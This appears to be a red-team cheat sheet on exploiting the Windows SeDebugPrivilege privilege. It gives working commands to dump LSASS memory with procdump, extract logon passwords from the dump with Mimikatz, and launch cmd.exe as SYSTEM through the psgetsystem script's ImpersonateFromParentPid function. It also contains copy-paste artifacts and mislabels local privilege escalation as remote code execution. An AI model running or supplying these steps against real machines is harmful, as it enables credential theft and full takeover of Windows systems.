# SeDebugPrivilege

#### **What is SeDebugPrivilege?**

* **SeDebugPrivilege** is a powerful Windows privilege that allows a user to debug and interact with any process running on the system, even those running as **SYSTEM**. This privilege is primarily intended for developers and administrators to debug applications but can be exploited to escalate privileges.
* **Key Command:**
  * `whoami /priv` → Check if the current user has **SeDebugPrivilege**. If listed, this privilege can be abused to access sensitive system processes like `LSASS` or escalate privileges by injecting malicious code into these processes.

#### **Exploiting SeDebugPrivilege**

If a user has **SeDebugPrivilege**, they can exploit it to interact with high-privileged processes, especially those running as SYSTEM. By accessing these processes, an attacker can extract sensitive information, such as credentials or passwords, or gain full control over the system.

Here are the main methods for exploiting **SeDebugPrivilege**:

## **1. Dumping LSASS to Extract Credentials**

The **Local Security Authority Subsystem Service (LSASS)** is responsible for enforcing the security policy on the system, handling password changes, and validating users for login. **LSASS** holds credentials in memory, and if **SeDebugPrivilege** is enabled, it can be dumped to extract these credentials.

**Steps to Exploit LSASS Dumping:**

1.  **Use ProcDump**:

    ```perl
    procdump.exe -accepteula -ma lsass.exe lsass.dmp
    ```

    **Explanation:**

    * `-ma` → Captures a full memory dump of the `lsass.exe` process.
    * `lsass.dmp` → The output dump file that can later be analyzed to extract credentials.
2.  **Analyze the dump with Mimikatz**:

    ```arduino
    arduinoCopy codemimikatz.exe
    mimikatz # sekurlsa::minidump lsass.dmp
    mimikatz # sekurlsa::logonpasswords
    ```

    **Explanation:**

    * `sekurlsa::minidump` → Loads the dumped file.
    * `sekurlsa::logonpasswords` → Extracts credentials from the dump.

## 2. Exploiting SeDebugPrivilege for RCE as SYSTEM

#### **Overview**

The **SeDebugPrivilege** can be used to gain **Remote Code Execution (RCE)** as **SYSTEM** by manipulating processes and inheriting elevated tokens from a SYSTEM-level process. The basic idea is to launch a child process that inherits the token of the parent process, which is running with **SYSTEM** privileges. By leveraging **SeDebugPrivilege**, we can alter the system's normal behavior and execute commands with SYSTEM rights.

#### **Steps to Achieve RCE as SYSTEM Using SeDebugPrivilege**

1.  **Identify a SYSTEM-level process:**

    First, we need to identify a process that is running with **SYSTEM** privileges. We can do this using the `tasklist` command in an elevated PowerShell session.

    **Command:**

    ```mathematica
    PS C:\> tasklist
    ```

    This will give you a list of running processes along with their **PID** (Process IDs). Locate the **PID** of a process running as **SYSTEM**.

***

2.  **Using psgetsystem Tool:**

    We will now use the **psgetsystem** tool, which can be found [here](https://github.com/decoder-it/psgetsystem), to impersonate the **SYSTEM** privileges of the identified parent process and launch a command as SYSTEM.

    **Steps to Use psgetsystem:**

    1.  **Download and Import the Script**:

        After downloading the `psgetsys.ps1` script from the repository, import it into your PowerShell session:

        **Command:**

        ```shell
        PS> . .\psgetsys.ps1
        ```
    2.  **Impersonate SYSTEM Using Parent Process ID (PPID):**

        Now, use the **ImpersonateFromParentPid** function to impersonate SYSTEM by specifying the **Parent Process ID** (`ppid`) of the SYSTEM-level process you found earlier. You can then execute any command as SYSTEM.

        **Command:**

        ```shell
        PS> ImpersonateFromParentPid -ppid <parentpid> -command <command to execute> -cmdargs <command arguments>
        ```

        For example, to launch **cmd.exe** as SYSTEM, you would run the following:

        **Example Command:**

        ```bash
        ImpersonateFromParentPid -ppid 612 -command "C:\Windows\System32\cmd.exe" -cmdargs ""
        ```

        * **-ppid** → Specifies the Parent Process ID (the SYSTEM process ID obtained earlier).
        * **-command** → The command to be executed (in this case, `cmd.exe`).
        * **-cmdargs** → Any additional command arguments (optional).

